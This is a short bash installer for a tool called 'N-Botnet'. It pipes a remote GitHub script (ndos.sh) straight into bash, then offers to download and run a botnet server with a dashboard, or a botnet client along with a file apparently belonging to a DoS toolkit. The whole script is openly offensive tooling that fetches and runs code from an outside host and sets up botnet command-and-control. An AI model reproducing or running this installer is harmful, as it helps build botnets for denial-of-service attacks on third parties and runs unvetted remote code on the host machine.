#!/usr/bin/env bash
clear
apt update
apt install python3
pip install websockets
bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/ndos.sh)
clear

echo "N-Botnet"
echo ""
echo "1. Install Botnet Server"
echo "2. Install Botnet Client"
echo ""

read -p "Enter your choice: " choice

if [ "$choice" = "1" ]; then
    clear
    echo "Installing Botnet Server"
    wget http://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/server/server.py
    wget https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/server/dashboard.html
    clear
    echo "You can change server ip, port and password in: server.py"
    python3 server.py
elif [ "$choice" = "2" ]; then
    clear
    echo "Installing Botnet Client"
    wget https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/client/client.py
    wget https://raw.githubusercontent.com/anhnoine/nDoS/refs/heads/main/tools/nDoS.mno
    clear
    echo "You can change in: client.py"
else
    clear
    echo "Try again?"
fi
